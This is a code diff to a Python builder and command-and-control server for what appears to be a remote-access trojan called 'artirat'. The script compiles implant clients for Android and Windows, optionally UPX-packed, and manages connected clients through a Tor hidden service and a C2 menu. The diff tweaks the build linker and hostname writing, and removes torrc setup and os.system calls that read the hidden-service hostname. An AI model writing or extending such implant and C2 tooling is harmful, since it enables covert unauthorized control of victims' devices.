@@ -467,7 +467,7 @@ def build_client(target: str, verbose=False, static=False, upx=False):
     print(f"[*] Building {kind} for {t} (this may take a while)...")
     env = os.environ.copy()
     if target == "android" or t == "aarch64-linux-android":
-        env["CARGO_TARGET_AARCH64_LINUX_ANDROID_LINKER"] = "aarch64-linux-android21-clang"
+        env["CARGO_TARGET_AARCH64_LINUX_ANDROID_LINKER"] = "aarch64-linux-android-clang"
 
     rustflags = env.get("RUSTFLAGS", "")
     is_windows = "windows" in target
@@ -703,32 +703,15 @@ def create_hidden_service(controller):
 
 def write_hostname(hostname: str):
     os.makedirs(CLIENT_CONFIG_DIR, exist_ok=True)
-    content = hostname
     with open(CLIENT_HOSTNAME_PATH, "w") as f:
-        f.write(content)
+        f.write(hostname + "\n")
     print(f"[+] Wrote hostname to {CLIENT_HOSTNAME_PATH}")
 
 
 def run_c2_server():
-    import shutil
-    try:
-        shutil.copyfile("torrc","/etc/tor/torrc")
-    
-        os.system("systemctl restart tor@default")
-    except:
-        pass
     manager = ClientManager()
     threading.Thread(target=accept_clients, args=(manager,), daemon=True).start()
     time.sleep(0.3)
-    controller = connect_tor()
-    try:
-        file = open('../../usr/var/lib/tor/artirat/hostname',"r")
-        hostname = file.read()
-        write_hostname(hostname)
-    except:
-        os.system(" cat /var/lib/tor/art1rat/hostname > artirat-client/config/hostname")
-        print("[*] Copied Hidden Service Hostname")
-        
     print()
     c2_menu(manager)
 
